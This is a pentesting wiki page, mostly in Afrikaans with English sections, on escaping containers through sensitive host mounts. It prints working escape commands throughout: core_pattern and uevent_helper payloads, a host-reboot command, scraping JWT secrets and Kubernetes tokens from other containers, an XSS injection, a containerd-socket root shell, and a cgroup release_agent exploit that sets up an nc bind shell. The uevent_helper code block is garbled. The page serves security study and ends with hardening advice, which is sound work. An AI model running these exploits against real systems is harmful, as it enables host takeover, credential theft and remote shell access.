# Sensitiewe Monte

{{#include ../../../../banners/hacktricks-training.md}}

Die blootstelling van `/proc`, `/sys`, en `/var` sonder behoorlike naamruimte-isolasie stel beduidende sekuriteitsrisiko's in, insluitend die vergroting van die aanvaloppervlak en inligtingsontsluiting. Hierdie gidse bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n ongemagtigde gebruiker toegang verkry, kan lei tot houerontvlugting, gasheerwysiging, of inligting kan verskaf wat verdere aanvalle ondersteun. Byvoorbeeld, om `-v /proc:/host/proc` verkeerd te monteer kan AppArmor-beskerming omseil weens sy padgebaseerde aard, wat `/host/proc` onbeskermd laat.

**Jy kan verdere besonderhede van elke potensiële kwesbaarheid vind in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Kwesbaarhede

### `/proc/sys`

Hierdie gids laat toegang toe om kernvariabeles te wysig, gewoonlik via `sysctl(2)`, en bevat verskeie subgidse van bekommernis:

#### **`/proc/sys/kernel/core_pattern`**

- Beskryf in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- As jy binne hierdie lêer kan skryf, is dit moontlik om 'n pyp `|` gevolg deur die pad na 'n program of skrip te skryf wat uitgevoer sal word nadat 'n ongeluk plaasvind.
- 'n Aanvaller kan die pad binne die gasheer na sy houer vind deur `mount` uit te voer en die pad na 'n binêre lêer binne sy houer lêerstelsel te skryf. Dan, laat 'n program crash om die kern die binêre lêer buite die houer te laat uitvoer.

- **Toetsing en Exploit Voorbeeld**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Kontroleer [hierdie pos](https://pwning.systems/posts/escaping-containers-for-fun/) vir meer inligting.

Voorbeeldprogram wat crash:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Gedetailleerd in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Bevat die pad na die kernmodule-laaier, wat aangeroep word om kernmodules te laai.
- **Toegang Kontrole Voorbeeld**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Verwys na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- 'n Globale vlag wat beheer of die kern paniek of die OOM-killer aanroep wanneer 'n OOM-toestand voorkom.

#### **`/proc/sys/fs`**

- Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêerstelsel.
- Skryftoegang kan verskeie ontkenning-van-diens-aanvalle teen die gasheer moontlik maak.

#### **`/proc/sys/fs/binfmt_misc`**

- Laat registrasie van interprete vir nie-inheemse binêre formate gebaseer op hul magiese nommer toe.
- Kan lei tot privilige-eskalasie of root shell toegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
- Betrokke uitbuiting en verduideliking:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Diepgaande tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Ander in `/proc`

#### **`/proc/config.gz`**

- Mag die kernkonfigurasie onthul as `CONFIG_IKCONFIG_PROC` geaktiveer is.
- Nuttig vir aanvallers om kwesbaarhede in die lopende kern te identifiseer.

#### **`/proc/sysrq-trigger`**

- Laat aanroep van Sysrq-opdragte toe, wat moontlik onmiddellike stelselhervattings of ander kritieke aksies kan veroorsaak.
- **Hervatting van Gasheer Voorbeeld**:

```bash
echo b > /proc/sysrq-trigger # Herlaai die gasheer
```

#### **`/proc/kmsg`**

- Stel kernringbufferboodskappe bloot.
- Kan help met kernuitbuitings, adreslekke, en sensitiewe stelselinligting verskaf.

#### **`/proc/kallsyms`**

- Lys kerngeëksporteerde simbole en hul adresse.
- Essensieel vir kernuitbuiting ontwikkeling, veral om KASLR te oorkom.
- Adresinligting is beperk met `kptr_restrict` op `1` of `2` gestel.
- Besonderhede in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfacing met die kern geheue toestel `/dev/mem`.
- Histories kwesbaar vir privilige-eskalasie aanvalle.
- Meer oor [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Verteenwoordig die stelsel se fisiese geheue in ELF kernformaat.
- Lees kan die gasheer stelsel en ander houers se geheue-inhoud lek.
- Groot lêergrootte kan lei tot leesprobleme of sagtewarekrake.
- Gedetailleerde gebruik in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternatiewe interfacing vir `/dev/kmem`, wat kern virtuele geheue verteenwoordig.
- Laat lees en skryf toe, en dus direkte wysiging van kern geheue.

#### **`/proc/mem`**

- Alternatiewe interfacing vir `/dev/mem`, wat fisiese geheue verteenwoordig.
- Laat lees en skryf toe, wysiging van alle geheue vereis om virtuele na fisiese adresse op te los.

#### **`/proc/sched_debug`**

- Teruggee proses skedulering inligting, wat PID naamruimte beskermings omseil.
- Stel prosesname, ID's, en cgroup identifiseerders bloot.

#### **`/proc/[pid]/mountinfo`**

- Verskaf inligting oor monteerpunte in die proses se monteer naamruimte.
- Stel die ligging van die houer `rootfs` of beeld bloot.

### `/sys` Kwesbaarhede

#### **`/sys/kernel/uevent_helper`**

- Gebruik vir die hantering van kern toestel `uevents`.
- Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer wanneer `uevent` triggers plaasvind.
- **Voorbeeld vir Uitbuiting**:
```bash

#### Creates a payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Finds host path from OverlayFS mount for container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Sets uevent_helper to malicious helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Triggers a uevent

echo change > /sys/class/mem/null/uevent

#### Reads the output

cat /output
```

#### **`/sys/class/thermal`**

- Controls temperature settings, potentially causing DoS attacks or physical damage.

#### **`/sys/kernel/vmcoreinfo`**

- Leaks kernel addresses, potentially compromising KASLR.

#### **`/sys/kernel/security`**

- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
- Access might enable a container to disable its MAC system.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

- Exposes interfaces for interacting with EFI variables in NVRAM.
- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### **`/sys/kernel/debug`**

- `debugfs` offers a "no rules" debugging interface to the kernel.
- History of security issues due to its unrestricted nature.

### `/var` Vulnerabilities

The host's **/var** folder contains container runtime sockets and the containers' filesystems.
If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
containers and applications that run in them.

#### Kubernetes

If a container like this is deployed with Kubernetes:

```yaml
apiVersion: v1  
kind: Pod  
metadata:  
  name: pod-mounts-var  
  labels:  
    app: pentest  
spec:  
  containers:  
  - name: pod-mounts-var-folder  
    image: alpine  
    volumeMounts:  
    - mountPath: /host-var  
      name: noderoot  
    command: [ "/bin/sh", "-c", "--" ]  
    args: [ "while true; do sleep 30; done;" ]  
  volumes:  
  - name: noderoot  
    hostPath:  
      path: /var
```

Inside the **pod-mounts-var-folder** container:

```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Gestoor XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```

The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.

You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:

```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```

#### Docker

The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
the other containers' filesystems are available under a different base path:

```bash
$ docker info | grep -i 'docker root\|storage driver'
Berging bestuurder: overlay2
Docker wortel gids: /var/lib/docker
```

So the filesystems are under `/var/lib/docker/overlay2/`:

```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
<SNIP>
```

#### Note

The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
locate the other containers' filesystems and SA / web identity tokens



### Other Sensitive Host Sockets and Directories (2023-2025)

Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:

```text
/run/containerd/containerd.sock     # containerd CRI-soket  
/var/run/crio/crio.sock             # CRI-O runtime-soket  
/run/podman/podman.sock             # Podman API (rootful of rootloos)  
/run/buildkit/buildkitd.sock        # BuildKit daemon (rootful)  
/var/run/kubelet.sock               # Kubelet API op Kubernetes-knope  
/run/firecracker-containerd.sock    # Kata / Firecracker
```

Attack example abusing a mounted **containerd** socket:

```bash
# binne die houer (socket is gemonteer by /host/run/containerd.sock)
ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /host/run/containerd.sock run --tty --privileged --mount \
type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/bash   # volle root shell op die gasheer
```

A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.

Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:

```bash
# aanneem dat die houer CAP_SYS_ADMIN het en 'n kwesbare kern
mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release

echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # vereis CVE-2022-0492

echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
sh -c "echo 0 > /tmp/x/cgroup.procs"  # aktiveer die leë-groep gebeurtenis
```

When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.

### Mount-Related Escape CVEs (2023-2025)

* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
runc ≤ 1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥ 25.0.3, containerd ≥ 1.7.14).

```Dockerfile
FROM scratch
WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
CMD ["/bin/sh"]
```

* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.

* **CVE-2024-1753 – Buildah / Podman bind-mount breakout during `build`**
Buildah ≤ 1.35.0 (and Podman ≤ 4.9.3) incorrectly resolved absolute paths passed to `--mount=type=bind` in a *Containerfile*. A crafted build stage could mount `/` from the host **read-write** inside the build container when SELinux was disabled or in permissive mode, leading to full escape at build time. Patched in Buildah 1.35.1 and the corresponding Podman 4.9.4 back-port series.

* **CVE-2024-40635 – containerd UID integer overflow**
Supplying a `User` value larger than `2147483647` in an image config overflowed the 32-bit signed integer and started the process as UID 0 inside the host user namespace. Workloads expected to run as non-root could therefore obtain root privileges. Fixed in containerd 1.6.38 / 1.7.27 / 2.0.4.

### Hardening Reminders (2025)

1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
3. Keep the container runtime up-to-date (runc ≥ 1.1.12, BuildKit ≥ 0.12.5, Buildah ≥ 1.35.1 / Podman ≥ 4.9.4, containerd ≥ 1.7.27).
4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.

### References

- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
- [Buildah CVE-2024-1753 advisory](https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf)
- [containerd CVE-2024-40635 advisory](https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg)

{{#include ../../../../banners/hacktricks-training.md}}
